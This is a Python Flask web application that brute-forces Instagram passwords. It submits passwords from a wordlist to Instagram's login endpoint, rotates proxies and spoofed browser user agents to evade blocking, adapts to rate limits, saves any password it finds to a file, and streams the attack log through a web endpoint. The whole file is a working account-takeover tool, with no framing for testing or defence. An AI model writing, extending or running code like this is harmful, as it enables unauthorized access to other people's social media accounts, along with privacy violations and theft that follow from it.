from flask import Flask, request, Response, jsonify, render_template_string
import requests
import time
import json
import sys
import random
from itertools import cycle
import threading

app = Flask(__name__)

# Global variable for streaming output
output_buffer = []
output_lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
]

def instagram_login(username, password, proxy=None, user_agent=None):
    session = requests.Session()
    ua = user_agent or random.choice(USER_AGENTS)
    session.headers.update({
        'User-Agent': ua,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/',
    })
    try:
        resp = session.get('https://www.instagram.com/accounts/login/', proxies=proxy, timeout=10)
        csrf = None
        for cookie in session.cookies:
            if cookie.name == 'csrftoken':
                csrf = cookie.value
                break
        if not csrf:
            return False, "No CSRF token"
    except Exception as e:
        return False, str(e)

    data = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'stopDeletionNonce': '',
        'trustedDeviceRecords': '{}',
    }
    session.headers.update({'X-CSRFToken': csrf, 'X-Instagram-AJAX': '1'})
    try:
        resp = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data=data, proxies=proxy, timeout=10)
        result = resp.json()
        if result.get('authenticated'):
            return True, result
        else:
            error = result.get('message', 'Unknown error')
            return False, error
    except Exception as e:
        return False, str(e)

def run_bruteforce(username, wordlist, proxies, delay, max_attempts):
    global output_buffer
    with output_lock:
        output_buffer.clear()
    def log(msg):
        with output_lock:
            output_buffer.append(msg + "\n")
        print(msg)

    if not wordlist:
        log("[!] Wordlist is empty.")
        return
    proxy_list = proxies if proxies else []
    proxy_pool = cycle(proxy_list) if proxy_list else None

    log(f"[*] Target: {username}")
    log(f"[*] Passwords loaded: {len(wordlist)}")
    log(f"[*] Proxies: {len(proxy_list)}")
    log(f"[*] Delay: {delay}s")
    log("[*] Starting brute-force...")

    for idx, pwd in enumerate(wordlist, 1):
        if max_attempts > 0 and idx > max_attempts:
            log("[!] Max attempts reached. Stopping.")
            break
        proxy = None
        if proxy_pool:
            p = next(proxy_pool)
            proxy = {'http': p, 'https': p}
        ua = random.choice(USER_AGENTS)
        log(f"[{idx}/{len(wordlist)}] Trying: {pwd[:2]}{'*'*(len(pwd)-4)}{pwd[-2:] if len(pwd)>4 else ''}")
        success, response = instagram_login(username, pwd, proxy, ua)
        if success:
            log(f"[+] SUCCESS! Password: {pwd}")
            with open('found_password.txt', 'w') as f:
                f.write(f"{username}:{pwd}")
            return  # stop on success
        else:
            lower_resp = response.lower()
            if 'checkpoint' in lower_resp or 'challenge' in lower_resp:
                log("[!] Challenge/checkpoint triggered. Stopping to avoid account lock.")
                return
            if 'rate' in lower_resp or 'too many' in lower_resp:
                log("[!] Rate limited. Increasing delay temporarily.")
                time.sleep(delay * 2)
            log(f"[-] Failed: {response[:100]}")
        time.sleep(delay)
    log("[*] Wordlist exhausted. No password found.")

@app.route('/')
def index():
    # Serve the embedded HTML (or you can serve a separate index.html)
    with open('index.html', 'r') as f:
        return f.read()

@app.route('/start', methods=['POST'])
def start():
    data = request.json
    username = data.get('username', '').strip()
    wordlist = data.get('wordlist', [])
    proxies = data.get('proxies', [])
    delay = int(data.get('delay', 30))
    max_attempts = int(data.get('max_attempts', 0))

    if not username or not wordlist:
        return jsonify({"error": "Username and wordlist required"}), 400

    # Run the attack in a separate thread to avoid blocking
    def worker():
        run_bruteforce(username, wordlist, proxies, delay, max_attempts)
    threading.Thread(target=worker, daemon=True).start()

    # Stream logs via Server-Sent Events or plain text
    def generate():
        while True:
            with output_lock:
                if output_buffer:
                    # Send accumulated lines
                    lines = output_buffer.copy()
                    output_buffer.clear()
                    for line in lines:
                        yield line
                if not any(thread.is_alive() for thread in threading.enumerate() if thread.name == 'worker'):
                    # If worker finished, send remaining and break
                    with output_lock:
                        if output_buffer:
                            lines = output_buffer.copy()
                            output_buffer.clear()
                            for line in lines:
                                yield line
                    break
            time.sleep(0.5)
    return Response(generate(), mimetype='text/plain')

if __name__ == '__main__':
    # Run on all interfaces, port 5000
    app.run(host='0.0.0.0', port=5000, debug=False)
